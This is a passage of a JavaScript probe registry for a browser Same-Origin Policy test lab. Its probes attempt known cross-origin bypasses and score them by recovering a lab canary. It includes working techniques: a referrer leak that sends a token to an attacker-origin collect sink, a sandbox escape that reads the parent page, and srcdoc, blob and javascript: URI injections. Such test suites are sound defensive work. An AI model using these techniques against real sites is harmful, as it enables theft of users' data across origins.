/**
 * SOP Lab probe registry — the lateral task set.
 *
 * One file, loaded identically by the Playwright runner and by the hosted
 * dashboard, so an automated verdict and a hand-driven verdict cannot diverge.
 *
 * Every probe returns a verdict drawn from a closed set:
 *
 *   BYPASS        Data or DOM access crossed an origin boundary that the
 *                 Same-Origin Policy is supposed to close. Requires evidence.
 *   BLOCKED       The boundary held. This is the expected result for a patched
 *                 engine, and a suite without BLOCKED results is not measuring
 *                 anything.
 *   INCONCLUSIVE  Ran, but the outcome does not distinguish bypass from block.
 *   UNSUPPORTED   The primitive does not exist in this engine.
 *   ERROR         The probe itself failed.
 *
 * A BYPASS verdict is only accepted by the runner when `evidence` contains the
 * per-run canary. The canary is regenerated on every server boot, so it cannot
 * be hardcoded, guessed, or replayed from a previous run — it is the only thing
 * that makes "the boundary was crossed" a measurement rather than an opinion.
 *
 * Lanes group probes by the mechanism under test, not by CVE, because the same
 * mechanism resurfaces under many CVE numbers across engines.
 */
(function (global) {
  'use strict';

  var V = {
    BYPASS: 'BYPASS',
    BLOCKED: 'BLOCKED',
    INCONCLUSIVE: 'INCONCLUSIVE',
    UNSUPPORTED: 'UNSUPPORTED',
    ERROR: 'ERROR',
  };

  // -----------------------------------------------------------------------
  // Helpers
  // -----------------------------------------------------------------------

  function lab() {
    return global.__SOP_LAB__ || { origins: {}, runId: null, self: location.origin };
  }
  function O() { return lab().origins; }

  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }

  /** Resolve on the first of: predicate true, or timeout. Never throws. */
  function waitFor(pred, ms, step) {
    ms = ms || 3000; step = step || 40;
    var start = Date.now();
    return new Promise(function (resolve) {
      (function tick() {
        var ok = false;
        try { ok = Boolean(pred()); } catch (_) { ok = false; }
        if (ok) return resolve(true);
        if (Date.now() - start >= ms) return resolve(false);
        setTimeout(tick, step);
      })();
    });
  }

  /** Append a frame, resolve when loaded (or on timeout). Caller cleans up. */
  function addFrame(attrs, ms) {
    var f = document.createElement('iframe');
    f.style.cssText = 'width:320px;height:120px;border:1px solid #444';
    Object.keys(attrs || {}).forEach(function (k) {
      if (k === 'sandbox') f.setAttribute('sandbox', attrs[k]);
      else f.setAttribute(k, attrs[k]);
    });
    var done = new Promise(function (resolve) {
      var settled = false;
      function fin() { if (!settled) { settled = true; resolve(f); } }
      f.addEventListener('load', fin);
      f.addEventListener('error', fin);
      setTimeout(fin, ms || 4000);
    });
    (document.getElementById('sop-stage') || document.body).appendChild(f);
    return done;
  }

  function removeFrame(f) { try { f && f.remove(); } catch (_) {} }

  /** Read a property path off a possibly cross-origin object. */
  function probeRead(obj, pathStr) {
    try {
      var cur = obj;
      var parts = pathStr.split('.');
      for (var i = 0; i < parts.length; i++) {
        cur = cur[parts[i]];
        if (cur === undefined || cur === null) break;
      }
      return { ok: true, value: cur };
    } catch (e) {
      return { ok: false, error: String(e && e.name ? e.name + ': ' + e.message : e) };
    }
  }

  /**
   * Canary detection is pattern-based on purpose.
   *
   * A probe must never be handed the canary value it is trying to steal —
   * otherwise a buggy probe can "succeed" by reporting a secret it was given for
   * free. So attacker-side pages are served without the canary (the server only
   * injects it for origins the manifest lists as trusted readers), probes
   * recognise it by shape alone, and the runner performs the authoritative
   * comparison against the real value it read from the server's boot line.
   * Shape match in-page, exact match out-of-page.
   */
  function extractCanary(x) {
    try {
      var m = String(x).match(/SOPLAB-CANARY-[0-9A-F]{32}/);
      return m ? m[0] : null;
    } catch (_) { return null; }
  }

  function canaryIn(x) { return extractCanary(x) !== null; }


  /**
   * Recover the byte string encoded in a canvas's first pixel row.
   *
   * /lab/canary.png encodes the canary one byte per pixel as 8-bit greyscale, so
   * byte N comes back as the red channel of pixel N. Returns null if the read is
   * blocked (a correctly tainted canvas throws SecurityError here) — which is the
   * expected, healthy outcome.
   */
  function readCanvasRowAsString(canvas, len) {
    try {
      var ctx = canvas.getContext('2d');
      var d = ctx.getImageData(0, 0, Math.min(len || canvas.width, canvas.width), 1).data;
      var out = '';
      for (var i = 0; i < d.length; i += 4) out += String.fromCharCode(d[i]);
      return out;
    } catch (e) {
      return null;
    }
  }

  /** Load an image and resolve once it has decoded (or failed). */
  function loadImage(src, crossOrigin) {
    return new Promise(function (resolve) {
      var img = new Image();
      if (crossOrigin) img.crossOrigin = crossOrigin;
      img.onload = function () { resolve(img); };
      img.onerror = function () { resolve(null); };
      img.src = src;
      setTimeout(function () { resolve(img.complete ? img : null); }, 5000);
    });
  }

  /** Decode a data: URL image back into its encoded byte string. */
  async function decodeDataUrlRow(dataUrl, len) {
    if (!dataUrl || dataUrl.indexOf('data:') !== 0) return null;
    var img = await loadImage(dataUrl, null);
    if (!img) return null;
    var c = document.createElement('canvas');
    c.width = img.naturalWidth || len || 1;
    c.height = 1;
    try { c.getContext('2d').drawImage(img, 0, 0); } catch (_) { return null; }
    // The data: URL is same-origin, so this canvas is untainted and readable.
    return readCanvasRowAsString(c, len);
  }

  function res(verdict, detail, evidence, extra) {
    return Object.assign({
      verdict: verdict,
      detail: detail || '',
      evidence: evidence == null ? null : String(evidence).slice(0, 2000),
    }, extra || {});
  }

  // -----------------------------------------------------------------------
  // Probes
  // -----------------------------------------------------------------------

  var PROBES = [

    // =====================================================================
    // LANE: origin-oracle — the documented-vs-loaded comparison
    // =====================================================================
    {
      id: 'ORACLE-01-documented-vs-loaded',
      lane: 'origin-oracle',
      title: 'Documented origin vs actually-loaded origin reconciliation',
      why: 'Establishes the boundary every other probe is measured against: what '
         + 'origin does the content declare, what origin is it really running in, '
         + 'and which origins the manifest authorises to read canary material.',
      runOn: 'ATTACKER',
      references: ['RFC 6454 §3 (origin as security principal)'],
      expect: { chromium: 'BLOCKED', firefox: 'BLOCKED', webkit: 'BLOCKED' },
      run: async function () {
        var r = await fetch(O().VICTIM + '/lab/origin-manifest.json',
          { mode: 'cors' }).then(function (x) { return x.json(); });
        var loaded = location.origin;
        var documented = r.documentedOrigin;
        var authorised = r.trustedReaders.indexOf(loaded) !== -1;
        // Now the actual test: can this un-authorised origin read the canary?
        var leak = null;
        try {
          var t = await fetch(O().VICTIM + '/lab/canary.json', { mode: 'cors' })
            .then(function (x) { return x.text(); });
          leak = extractCanary(t);
        } catch (e) { /* expected: CORS rejection */ }
        return res(
          leak ? V.BYPASS : V.BLOCKED,
          'documented=' + documented + ' loaded=' + loaded
            + ' authorisedReader=' + authorised
            + (leak ? ' — canary readable from an unauthorised origin'
                    : ' — canary not readable, CORS held'),
          leak,
          { documentedOrigin: documented, loadedOrigin: loaded, authorisedReader: authorised }
        );
      },
    },

    {
      id: 'ORACLE-02-cors-wildcard-read',
      lane: 'origin-oracle',
      title: 'Cross-origin JSON read permitted by wildcard ACAO',
      why: 'Control case proving the oracle detects a real boundary crossing. The '
         + 'server is told to answer with Access-Control-Allow-Origin: *, which is '
         + 'the single most common real-world SOP giveaway.',
      runOn: 'ATTACKER',
      references: ['Fetch Standard §3.2 CORS protocol'],
      expect: { chromium: 'BYPASS', firefox: 'BYPASS', webkit: 'BYPASS' },
      run: async function () {
        var t = await fetch(O().VICTIM + '/lab/canary.json?cors=*', { mode: 'cors' })
          .then(function (x) { return x.text(); });
        var c = extractCanary(t);
        return res(c ? V.BYPASS : V.BLOCKED,
          c ? 'wildcard ACAO let an unauthorised origin read canary material'
            : 'read did not return the canary', c);
      },
    },

    // =====================================================================
    // LANE: header-policy
    // =====================================================================
    {
      id: 'HDR-01-no-cors-json-read',
      lane: 'header-policy',
      title: 'Cross-origin JSON read with no CORS headers (baseline enforcement)',
      why: 'The negative control for the whole suite. If this returns BYPASS the '
         + 'engine is catastrophically broken or the harness is misconfigured; '
         + 'every other result should be distrusted until it is explained.',
      runOn: 'ATTACKER',
      references: ['Fetch Standard §3.2'],
      expect: { chromium: 'BLOCKED', firefox: 'BLOCKED', webkit: 'BLOCKED' },
      run: async function () {
        try {
          var t = await fetch(O().VICTIM + '/lab/canary.json', { mode: 'cors' })
            .then(function (x) { return x.text(); });
          var c = extractCanary(t);
          return res(c ? V.BYPASS : V.BLOCKED, 'fetch resolved', c);
        } catch (e) {
          return res(V.BLOCKED, 'fetch rejected as expected: ' + e.message, null);
        }
      },
    },

    {
      id: 'HDR-02-opaque-response-read',
      lane: 'header-policy',
      title: 'no-cors opaque response body is unreadable',
      why: 'mode:no-cors returns an opaque filtered response. The request is sent '
         + 'and cookies may ride along, but the body must not be readable — the '
         + 'distinction between "request happened" and "response readable".',
      runOn: 'ATTACKER',
      references: ['Fetch Standard §2.2.4 filtered responses'],
      expect: { chromium: 'BLOCKED', firefox: 'BLOCKED', webkit: 'BLOCKED' },
      run: async function () {
        var r = await fetch(O().VICTIM + '/lab/canary.json',
          { mode: 'no-cors', credentials: 'include' });
        var body = '';
        try { body = await r.text(); } catch (_) {}
        var c = extractCanary(body);
        return res(c ? V.BYPASS : V.BLOCKED,
          'type=' + r.type + ' status=' + r.status + ' bodyLen=' + body.length
          + ' — request was dispatched; body ' + (c ? 'LEAKED' : 'opaque as required'),
          c);
      },
    },

    {
      id: 'HDR-03-link-header-referrer-leak',
      lane: 'header-policy',
      title: 'Link header referrerpolicy=unsafe-url referrer leak (CVE-2025-4664)',
      why: 'Chrome uniquely resolved the Link header on subresource responses, so a '
         + 'response could downgrade the referrer policy of the request that '
         + 'fetched it and leak the full referrer URL, query string included. '
         + 'Fixed in the 136 line; on a patched build this must be BLOCKED.',
      runOn: 'VICTIM',
      references: ['CVE-2025-4664', 'CISA KEV'],
      expect: { chromium: 'BLOCKED', firefox: 'BLOCKED', webkit: 'BLOCKED' },
      run: async function () {
        await fetch(O().VICTIM + '/lab/reset').catch(function () {});
        // Secret rides in the query string of the *referring* URL.
        var secretQuery = 'oauth_token=' + (lab().canary || 'NO-CANARY');
        var sink = O().ATTACKER + '/lab/collect?via=link-header';
        var carrier = O().VICTIM + '/lab/link-preload?target='
          + encodeURIComponent(sink) + '&' + secretQuery;
        var img = new Image();
        img.src = carrier;
        await sleep(1200);
        var hits = await fetch(O().VICTIM + '/lab/hits')
          .then(function (x) { return x.json(); }).catch(function () { return { hits: [] }; });
        var leaked = (hits.hits || []).filter(function (h) {
          return h.kind.indexOf('collect') === 0 && h.leakedCanary;
        });
        return res(leaked.length ? V.BYPASS : V.BLOCKED,
          'sink hits=' + (hits.hits || []).length + ' canary-bearing=' + leaked.length
          + ' — ' + (leaked.length
              ? 'full referrer including query reached the cross-origin sink'
              : 'referrer was stripped or Link was not honoured on the subresource'),
          leaked.length ? JSON.stringify(leaked[0]) : null);
      },
    },

    // =====================================================================
    // LANE: script-execution — SOP's oldest by-design holes
    // =====================================================================
    {
      id: 'SCRIPT-01-cross-origin-script-tag',
      lane: 'script-execution',
      title: 'Cross-origin <script src> executes in the embedding origin (XSSI)',
      why: 'SOP never restricted script *execution* by origin, only reading the '
         + 'source text. A cross-origin script runs with the embedder\'s '
         + 'authority, so any secret the response body assigns to a global has '
         + 'crossed the boundary. This is the XSSI / JSONP class and it is not a '
         + 'bug in any engine — it is the model working as specified, which is '
         + 'exactly why it remains exploitable.',
      runOn: 'ATTACKER',
      references: ['RFC 6454', 'OWASP XSSI'],
      expect: { chromium: 'BYPASS', firefox: 'BYPASS', webkit: 'BYPASS' },
      run: async function () {
        delete global.__LEAKED_VIA_SCRIPT__;
        var s = document.createElement('script');
        s.src = O().VICTIM + '/lab/canary.js';
        document.head.appendChild(s);
        await waitFor(function () { return global.__LEAKED_VIA_SCRIPT__; }, 4000);
        var got = global.__LEAKED_VIA_SCRIPT__ || null;
        try { s.remove(); } catch (_) {}
        return res(got ? V.BYPASS : V.BLOCKED,
          got ? 'victim-origin script body executed in the attacker origin and '
              + 'handed over canary material'
              : 'script did not execute or set no global', got);
      },
    },

    {
      id: 'SCRIPT-02-script-error-message-leak',
      lane: 'script-execution',
      title: 'window.onerror message sanitisation for cross-origin scripts',
      why: 'Cross-origin script errors must be reported as the opaque "Script '
         + 'error." with no line or column, otherwise error text becomes a read '
         + 'channel into a cross-origin response body.',
      runOn: 'ATTACKER',
      references: ['HTML Standard: muted errors'],
      expect: { chromium: 'BLOCKED', firefox: 'BLOCKED', webkit: 'BLOCKED' },
      run: async function () {
        var captured = null;
        function onerr(msg, src, line, col) { captured = { msg: msg, src: src, line: line, col: col }; }
        global.addEventListener('error', function (e) {
          if (!captured) onerr(e.message, e.filename, e.lineno, e.colno);
        });
        var s = document.createElement('script');
        // Must be served with a real script MIME type, or Chromium refuses to
        // execute it on MIME grounds and the parser never runs — which reads as
        // "no error observed" and measures nothing. /lab/syntax-error.js is
        // genuinely malformed JS served as text/javascript, with the canary in
        // the source text so a source-leaking error object would be caught.
        s.src = O().VICTIM + '/lab/syntax-error.js?r=' + Math.random();
        document.head.appendChild(s);
        await waitFor(function () { return captured; }, 4000);
        try { s.remove(); } catch (_) {}
        if (!captured) return res(V.INCONCLUSIVE, 'no error event observed', null);
        var muted = /^Script error\.?$/.test(String(captured.msg).trim());
        var c = extractCanary(JSON.stringify(captured));
        return res(c ? V.BYPASS : V.BLOCKED,
          'muted=' + muted + ' msg=' + JSON.stringify(String(captured.msg).slice(0, 120)),
          c);
      },
    },

    // =====================================================================
    // LANE: sandbox-confinement
    // =====================================================================
    {
      id: 'SANDBOX-01-allow-scripts-allow-same-origin-escape',
      lane: 'sandbox-confinement',
      title: 'sandbox="allow-scripts allow-same-origin" escapes its own sandbox',
      why: 'Granting both tokens to same-origin content is self-defeating: the '
         + 'frame keeps the embedder\'s origin, so it can reach parent.document, '
         + 'read anything there, and delete its own sandbox attribute. Any site '
         + 'serving attacker-controlled content (uploads, previews, templates) '
         + 'from its own origin under these two tokens has handed that content '
         + 'full origin authority. The HTML spec warns about this explicitly; no '
         + 'engine treats it as a bug, which is why it keeps shipping.',
      runOn: 'VICTIM',
      references: ['HTML Standard §sandbox attribute warning'],
      expect: { chromium: 'BYPASS', firefox: 'BYPASS', webkit: 'BYPASS' },
      run: async function () {
        var marker = 'esc-' + Math.random().toString(36).slice(2);
        var holder = document.createElement('div');
        holder.id = marker;
        holder.setAttribute('data-canary', lab().canary || '');
        holder.textContent = lab().canary || '';
        document.body.appendChild(holder);

        var f = await addFrame({
          src: O().VICTIM + '/lab/headers',
          sandbox: 'allow-scripts allow-same-origin',
        });
        await sleep(150);
        var out = { reachedParent: false, stolen: null, sandboxCleared: false, err: null };
        try {
          // Drive from inside the frame's own realm, which is the attacker's
          // position in the real-world version of this.
          out = f.contentWindow.eval('(function(){\n'
            + '  var o={reachedParent:false,stolen:null,sandboxCleared:false,err:null};\n'
            + '  try{\n'
            + '    var el=parent.document.getElementById(' + JSON.stringify(marker) + ');\n'
            + '    o.reachedParent=true;\n'
            + '    o.stolen=el?el.getAttribute("data-canary"):null;\n'
            + '    var me=parent.document.querySelector("iframe[sandbox]");\n'
            + '    if(me){me.removeAttribute("sandbox");o.sandboxCleared=!me.hasAttribute("sandbox");}\n'
            + '  }catch(e){o.err=String(e);}\n'
            + '  return o;\n'
            + '})()');
        } catch (e) { out.err = String(e); }
        removeFrame(f);
        try { holder.remove(); } catch (_) {}
        return res(out.stolen && canaryIn(out.stolen) ? V.BYPASS : V.BLOCKED,
          'reachedParent=' + out.reachedParent + ' sandboxCleared=' + out.sandboxCleared
          + (out.err ? ' err=' + out.err : ''),
          out.stolen);
      },
    },

    {
      id: 'SANDBOX-02-cross-origin-sandbox-holds',
      lane: 'sandbox-confinement',
      title: 'Sandboxed cross-origin frame stays confined',
      why: 'Same two tokens, but the frame is genuinely cross-origin. The escape '
         + 'must fail here, which is what proves SANDBOX-01 is about origin '
         + 'inheritance rather than a sandbox parsing flaw.',
      runOn: 'VICTIM',
      references: ['HTML Standard §sandbox attribute'],
      expect: { chromium: 'BLOCKED', firefox: 'BLOCKED', webkit: 'BLOCKED' },
      run: async function () {
        var f = await addFrame({
          src: O().ATTACKER + '/lab/headers',
          sandbox: 'allow-scripts allow-same-origin',
        });
        var r = probeRead(f, 'contentWindow.document.body.innerHTML');
        removeFrame(f);
        return res(r.ok && canaryIn(r.value) ? V.BYPASS : V.BLOCKED,
          r.ok ? 'read resolved, value len=' + String(r.value).length
               : 'blocked: ' + r.error,
          r.ok ? extractCanary(r.value) : null);
      },
    },

    // =====================================================================
    // LANE: origin-inheritance
    // =====================================================================
    {
      id: 'INHERIT-01-srcdoc-inherits-embedder-origin',
      lane: 'origin-inheritance',
      title: 'iframe srcdoc runs in the embedder origin',
      why: 'A srcdoc frame has no URL of its own and inherits the embedder\'s '
         + 'origin. Benign alone; decisive when srcdoc content survives an HTML '
         + 'sanitiser, because injected markup then executes with full origin '
         + 'authority and reads anything same-origin.',
      runOn: 'VICTIM',
      references: ['HTML Standard §iframe srcdoc'],
      expect: { chromium: 'BYPASS', firefox: 'BYPASS', webkit: 'BYPASS' },
      run: async function () {
        var f = await addFrame({
          srcdoc: '<script>try{parent.postMessage({srcdoc:1,'
            + 'origin:location.origin,'
            + 'stolen:(parent.document.getElementById("sop-canary")||{}).textContent'
            + '},"*")}catch(e){parent.postMessage({srcdoc:1,err:String(e)},"*")}<\/script>',
        });
        var got = null;
        var onmsg = function (e) { if (e.data && e.data.srcdoc) got = e.data; };
        global.addEventListener('message', onmsg);
        await waitFor(function () { return got; }, 3000);
        global.removeEventListener('message', onmsg);
        removeFrame(f);
        if (!got) return res(V.INCONCLUSIVE, 'srcdoc frame never reported', null);
        return res(canaryIn(got.stolen) ? V.BYPASS : V.BLOCKED,
          'frame origin=' + got.origin + (got.err ? ' err=' + got.err : ''),
          got.stolen);
      },
    },

    {
      id: 'INHERIT-02-blob-url-inherits-creator-origin',
      lane: 'origin-inheritance',
      title: 'blob: URL document inherits its creator origin',
      why: 'blob:https://host/uuid executes in the origin that minted it, so a '
         + 'blob frame is same-origin with its creator and is not a boundary. '
         + 'Chrome 137 partitioned blob URL access by storage key; this probe '
         + 'records what the engine under test actually does.',
      runOn: 'VICTIM',
      references: ['File API §blob URL store', 'Chrome 137 blob URL partitioning'],
      expect: { chromium: 'BYPASS', firefox: 'BYPASS', webkit: 'BYPASS' },
      run: async function () {
        var html = '<script>try{parent.postMessage({blob:1,origin:location.origin,'
          + 'stolen:(parent.document.getElementById("sop-canary")||{}).textContent},"*")}'
          + 'catch(e){parent.postMessage({blob:1,err:String(e)},"*")}<\/script>';
        var url = URL.createObjectURL(new Blob([html], { type: 'text/html' }));
        var got = null;
        var onmsg = function (e) { if (e.data && e.data.blob) got = e.data; };
        global.addEventListener('message', onmsg);
        var f = await addFrame({ src: url });
        await waitFor(function () { return got; }, 3000);
        global.removeEventListener('message', onmsg);
        removeFrame(f);
        URL.revokeObjectURL(url);
        if (!got) return res(V.INCONCLUSIVE, 'blob frame never reported', null);
        return res(canaryIn(got.stolen) ? V.BYPASS : V.BLOCKED,
          'blobUrl=' + url.slice(0, 64) + ' frame origin=' + got.origin
          + (got.err ? ' err=' + got.err : ''), got.stolen);
      },
    },

    {
      id: 'INHERIT-03-cross-origin-blob-fetch',
      lane: 'origin-inheritance',
      title: 'blob: URL minted on one origin, dereferenced from another',
      why: 'The blob URL string is guessable-by-possession. If a different origin '
         + 'can fetch a blob URL carrying another origin\'s host, the blob store '
         + 'is not origin-keyed. Directly probes the Chrome 137 partitioning work.',
      runOn: 'ATTACKER',
      references: ['Chrome 137 blob URL partitioning', 'File API §blob URL store'],
      expect: { chromium: 'BLOCKED', firefox: 'BLOCKED', webkit: 'BLOCKED' },
      run: async function () {
        // The victim mints the blob in its own origin and posts out only the URL
        // string. Driving the victim frame directly is impossible from here (it
        // is cross-origin, correctly), so the URL has to arrive by message —
        // which is also the realistic shape: URLs leak, blob contents should not
        // follow them.
        var url = null;
        var onmsg = function (e) {
          if (e.data && e.data.__soplab_blob) url = e.data.blobUrl;
        };
        global.addEventListener('message', onmsg);
        var f = await addFrame({ src: O().VICTIM + '/lab/mint-blob' });
        await waitFor(function () { return url; }, 3000);
        global.removeEventListener('message', onmsg);
        if (!url) { removeFrame(f); return res(V.INCONCLUSIVE, 'victim never posted a blob URL', null); }

        var body = null, err = null;
        try { body = await fetch(url).then(function (x) { return x.text(); }); }
        catch (e) { err = String(e); }

        // Second route: frame the blob URL directly, since fetch and navigation
        // are gated separately.
        var frameRead = null;
        var f2 = await addFrame({ src: url });
        var rr = probeRead(f2, 'contentWindow.document.body.innerText');
        if (rr.ok) frameRead = rr.value;
        removeFrame(f); removeFrame(f2);

        var c = extractCanary(body) || extractCanary(frameRead);
        return res(c ? V.BYPASS : V.BLOCKED,
          'blobUrl=' + String(url).slice(0, 72)
          + ' | fetch=' + (err ? 'rejected: ' + err.slice(0, 90) : 'resolved len='
            + String(body == null ? 0 : body.length))
          + ' | frameRead=' + (frameRead == null ? 'blocked' : 'len=' + String(frameRead).length)
          + ' — holding a foreign origin\'s blob URL is '
          + (c ? 'SUFFICIENT to read it' : 'not sufficient; the store is partitioned'),
          c);
      },
    },

    {
      id: 'INHERIT-04-javascript-uri-frame-navigation',
      lane: 'origin-inheritance',
      title: 'javascript: URI navigation of a cross-origin frame',
      why: 'A javascript: URI executes in the origin of the document being '
         + 'navigated. If an embedder can point one at a cross-origin frame the '
         + 'result is direct script injection into that origin — the canonical '
         + 'UXSS shape. Every current engine blocks it; the probe exists so a '
         + 'regression would be caught rather than assumed impossible.',
      runOn: 'VICTIM',
      references: ['HTML Standard §javascript: URLs', 'classic UXSS pattern'],
      expect: { chromium: 'BLOCKED', firefox: 'BLOCKED', webkit: 'BLOCKED' },
      run: async function () {
        var f = await addFrame({ src: O().ATTACKER + '/lab/canary' });
        var out = null, err = null;
        try {
          f.contentWindow.location = 'javascript:parent.postMessage({jsuri:1,'
            + 'origin:location.origin,stolen:document.body.innerText},"*")';
        } catch (e) { err = String(e); }
        var onmsg = function (e) { if (e.data && e.data.jsuri) out = e.data; };
        global.addEventListener('message', onmsg);
        await waitFor(function () { return out; }, 2500);
        global.removeEventListener('message', onmsg);
        removeFrame(f);
        if (!out) {
          return res(V.BLOCKED,
            'javascript: URI did not execute in the cross-origin frame'
            + (err ? ' (' + err.slice(0, 120) + ')' : ''), null);
        }
        return res(canaryIn(out.stolen) ? V.BYPASS : V.BLOCKED,
          'executed in origin=' + out.origin, out.stolen);
      },
    },

    // =====================================================================
    // LANE: origin-relaxation
    // =====================================================================
    {
      id: 'RELAX-01-document-domain-default',
      lane: 'origin-relaxation',
      title: 'document.domain relaxation with default agent clustering',
      why: 'Setting document.domain used to let two subdomains of one registrable '
         + 'domain become same-origin. Chrome disabled the effect by default in '
         + 'the 115 line: the setter still exists and may not throw, but the '
         + 'origin no longer relaxes. Whether the *effect* survives is the only '
         + 'thing worth measuring.',
      runOn: 'SIBLING',
      references: ['Chrome 115 document.domain deprecation', 'HTML Standard §document.domain'],
      expect: { chromium: 'BLOCKED', firefox: 'BYPASS', webkit: 'BYPASS' },
      run: async function () {
        var f = await addFrame({ src: O().VICTIM + '/lab/canary' });
        var setterErr = null, before = null, after = null;
        var oacState = ('originAgentCluster' in global) ? global.originAgentCluster : 'n/a';
        before = document.domain;
        try { document.domain = 'sop-lab.test'; } catch (e) { setterErr = String(e); }
        after = document.domain;
        await sleep(120);
        // The frame must also relax for access to open up; ask it to.
        try { f.contentWindow.eval('document.domain="sop-lab.test"'); } catch (_) {}
        await sleep(120);
        var r = probeRead(f, 'contentWindow.document.body.innerText');
        removeFrame(f);
        var c = r.ok ? extractCanary(r.value) : null;
        return res(c ? V.BYPASS : V.BLOCKED,
          'domain ' + before + ' -> ' + after
          + (before === after ? ' (setter was a silent no-op)' : ' (value changed)')
          + ' originAgentCluster=' + oacState
          + (setterErr ? ' setterThrew=' + setterErr.slice(0, 100) : ' setterOk')
          + ' crossRead=' + (r.ok ? 'resolved' : r.error), c);
      },
    },

    {
      id: 'RELAX-02-document-domain-mutual-optout',
      lane: 'origin-relaxation',
      title: 'document.domain relaxation with Origin-Agent-Cluster: ?0 on both documents',
      why: 'The decisive test of whether Chrome 115 removed origin relaxation or '
         + 'merely flipped its default. Both documents are served with '
         + 'Origin-Agent-Cluster: ?0 and both assign the same document.domain. If '
         + 'the cross-origin read then succeeds, relaxation is alive and any site '
         + 'still emitting that header keeps a cross-subdomain hole in its own '
         + 'SOP boundary — a materially different security story from "the '
         + 'feature was removed".',
      runOn: 'SIBLING',
      references: ['Origin-Agent-Cluster header', 'Chrome 115 document.domain deprecation',
        'HTML Standard §relaxing the same-origin restriction'],
      harnessQuery: 'oac=0',
      expect: { chromium: 'BYPASS', firefox: 'BYPASS', webkit: 'BYPASS' },
      run: async function () {
        var oacBefore = ('originAgentCluster' in global) ? global.originAgentCluster : 'n/a';
        var setterErr = null;
        try { document.domain = 'sop-lab.test'; } catch (e) { setterErr = String(e); }
        var selfRelaxed = document.domain === 'sop-lab.test';

        // The frame relaxes itself on load; see ?relax= on the server.
        var f = await addFrame({
          src: O().VICTIM + '/lab/canary?oac=0&relax=sop-lab.test',
        });
        // Relaxation takes effect for the pair only once both sides have assigned;
        // give the frame's inline script a moment to have run.
        await waitFor(function () {
          return probeRead(f, 'contentWindow.document').ok;
        }, 2500);

        var r = probeRead(f, 'contentWindow.document.body.innerText');
        var frameRelaxedTo = probeRead(f, 'contentWindow.__RELAXED_TO__');
        var frameRelaxErr = probeRead(f, 'contentWindow.__RELAX_ERROR__');
        removeFrame(f);

        var c = r.ok ? extractCanary(r.value) : null;
        return res(c ? V.BYPASS : V.BLOCKED,
          'self.domain=' + document.domain + ' selfRelaxed=' + selfRelaxed
          + ' originAgentCluster=' + oacBefore
          + (oacBefore === false ? ' (opt-out honoured)' : ' (WARNING: opt-out not applied)')
          + (setterErr ? ' setterThrew=' + setterErr.slice(0, 90) : ' setterOk')
          + ' frameRelaxedTo=' + (frameRelaxedTo.ok ? frameRelaxedTo.value : 'unreadable')
          + (frameRelaxErr.ok && frameRelaxErr.value ? ' frameRelaxErr=' + frameRelaxErr.value : '')
          + ' crossRead=' + (r.ok ? 'RESOLVED' : r.error),
          c);
      },
    },

    {
      id: 'RELAX-03-unilateral-relaxation-rejected',
      lane: 'origin-relaxation',
      title: 'Unilateral document.domain relaxation does not open the boundary',
      why: 'The control that keeps RELAX-02 honest. Only this side relaxes; the '
         + 'target does not. This must stay BLOCKED — otherwise relaxation would '
         + 'be an attacker-unilateral SOP bypass against any subdomain, which is a '
         + 'categorically more severe bug than a cooperative legacy feature.',
      runOn: 'SIBLING',
      references: ['HTML Standard §relaxing the same-origin restriction'],
      harnessQuery: 'oac=0',
      expect: { chromium: 'BLOCKED', firefox: 'BLOCKED', webkit: 'BLOCKED' },
      run: async function () {
        var setterErr = null;
        try { document.domain = 'sop-lab.test'; } catch (e) { setterErr = String(e); }
        // Target served with the opt-out but deliberately NOT relaxing itself.
        var f = await addFrame({ src: O().VICTIM + '/lab/canary?oac=0' });
        await sleep(300);
        var r = probeRead(f, 'contentWindow.document.body.innerText');
        removeFrame(f);
        var c = r.ok ? extractCanary(r.value) : null;
        return res(c ? V.BYPASS : V.BLOCKED,
          'self.domain=' + document.domain + ' (relaxed) target=NOT relaxed'
          + (setterErr ? ' setterThrew=' + setterErr.slice(0, 90) : ' setterOk')
          + ' crossRead=' + (r.ok ? 'RESOLVED — unilateral relaxation sufficed'
                                  : 'blocked, mutual opt-in correctly required'),
          c);
      },
    },

    {
      id: 'RELAX-04-insecure-origin-relaxation',
      lane: 'origin-relaxation',
      title: 'document.domain relaxation on an insecure origin, with no opt-out header',
      why: 'Origin-Agent-Cluster is only honoured in a secure context. If that is what '
         + 'carries the Chrome 115 default-flip, then plain http origins never received '
         + 'it and keep document.domain relaxation unconditionally — no header, no '
         + 'cooperation from the server, nothing to opt into. That would make the '
         + '"document.domain was disabled in 115" summary true only of https, which is a '
         + 'materially different claim. Run as the pair to RELAX-01: identical logic, '
         + 'insecure scheme.',
      runOn: 'INSECURE_SIBLING',
      references: ['Origin-Agent-Cluster header (secure-context gated)',
        'Chrome 115 document.domain deprecation', 'HTML Standard §document.domain'],
      expect: { chromium: 'BYPASS', firefox: 'BYPASS', webkit: 'BYPASS' },
      run: async function () {
        var oac = ('originAgentCluster' in global) ? global.originAgentCluster : 'n/a';
        var before = document.domain, setterErr = null;
        try { document.domain = 'sop-lab.test'; } catch (e) { setterErr = String(e); }
        var after = document.domain;
        var f = await addFrame({
          src: O().INSECURE + '/lab/canary?relax=sop-lab.test',
        });
        await waitFor(function () {
          return probeRead(f, 'contentWindow.document').ok;
        }, 2500);
        var r = probeRead(f, 'contentWindow.document.body.innerText');
        removeFrame(f);
        var c = r.ok ? extractCanary(r.value) : null;
        return res(c ? V.BYPASS : V.BLOCKED,
          'secureContext=' + global.isSecureContext
          + ' originAgentCluster=' + oac
          + ' domain ' + before + ' -> ' + after
          + (before === after ? ' (no-op)' : ' (CHANGED)')
          + (setterErr ? ' setterThrew=' + setterErr.slice(0, 80) : ' setterOk')
          + ' crossRead=' + (r.ok ? 'RESOLVED' : r.error)
          + ' — no Origin-Agent-Cluster header was sent to either document',
          c);
      },
    },

    // =====================================================================
    // LANE: opener-navigation
    // =====================================================================
    {
      id: 'OPENER-01-cross-origin-window-property-surface',
      lane: 'opener-navigation',
      title: 'Readable property surface of a cross-origin Window',
      why: 'A cross-origin Window is not fully opaque: the spec keeps a small '
         + 'CrossOriginProperties allowlist. Enumerating what actually reads back '
         + 'shows the true size of the leak surface, and any readable property '
         + 'outside that allowlist is an engine bug.',
      runOn: 'ATTACKER',
      references: ['HTML Standard §CrossOriginProperties'],
      expect: { chromium: 'BLOCKED', firefox: 'BLOCKED', webkit: 'BLOCKED' },
      run: async function () {
        var f = await addFrame({ src: O().VICTIM + '/lab/canary' });
        var allowed = ['window', 'self', 'location', 'close', 'closed', 'focus',
